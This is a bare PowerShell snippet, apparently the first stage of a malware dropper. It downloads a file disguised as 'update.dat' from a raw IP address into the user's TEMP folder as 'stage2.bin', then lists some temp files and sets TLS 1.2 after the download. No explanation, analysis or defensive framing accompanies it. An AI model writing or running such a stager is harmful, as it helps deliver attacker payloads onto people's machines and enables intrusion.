
$Stage1Url = "https://198.51.100.28:443/assets/update.dat"; $PayloadPath = "$env:TEMP\stage2.bin"; Invoke-WebRequest -Uri $Stage1Url -OutFile $PayloadPath -UseBasicParsing; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
